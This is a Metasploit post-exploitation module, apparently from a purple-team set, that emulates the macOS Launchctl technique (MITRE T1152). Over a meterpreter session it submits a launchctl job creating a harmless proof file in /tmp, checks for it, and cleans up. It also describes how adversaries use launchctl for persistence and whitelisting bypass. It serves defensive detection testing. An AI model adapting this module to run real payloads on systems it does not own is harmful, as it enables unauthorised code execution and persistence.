##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Launchctl (T1152) macOS - Purple Team',
      'Description'    => %q(
      Launchctl controls the macOS launchd process which handles things like
      launch agents and launch daemons, but can execute other commands or
      programs itself. Launchctl supports taking subcommands on the
      command-line, interactively, or even redirected from standard input.
      By loading or reloading launch agents or launch daemons, adversaries
      can install persistence or execute changes they made (Citation: Sofacy
      Komplex Trojan). Running a command from launchctl is as simple as
      launchctl submit -l -- /Path/to/thing/to/execute "arg" "arg" "arg".
      Loading, unloading, or reloading launch agents or launch daemons can
      require elevated privileges. Adversaries can abuse this functionality
      to execute code or even bypass whitelisting if launchctl is an
      allowed process.
      ),
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Praetorian' ],
      'Platform'       => [ 'osx' ],
      'References'     => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1152' ] ],
      'SessionTypes'   => [ 'meterpreter' ]))
    register_options(
      [
        OptBool.new("CLEANUP", [true, "Cleanup artifacts or not.", true]),
      ])
  end

  def run
    return 0 if session.type != "meterpreter"
    print_status('Proxying command execution through Launchctl...')

    # Run the command
    cmd = 'launchctl submit -l T1152 /usr/bin/touch "/tmp/T1152.txt" || echo fail'
    print_status("Running command - '#{cmd}'")
    output = cmd_exec(cmd)
    if output.include? 'fail'
      print_error('Command failed to execute!')
      return
    end

    # Check for success
    success = cmd_exec('ls /tmp/T1152.txt || echo fail')
    if success.include? 'fail'
      print_error('Tactic executed but proof file was not found.')
      return
    end
    print_good('Tactic T1152 successfully executed!')

    # Cleanup
    if datastore['CLEANUP']
      print_status('Cleaning up artifacts...')
      clean_file = cmd_exec('rm -f /tmp/T1152.txt || echo fail')
      clean_job = cmd_exec('launchctl remove T1152')
      if (clean_file.include? 'fail') || (clean_job.include? 'fail')
        print_error('Failed to remove artifacts.')
      end
    end
  end
end
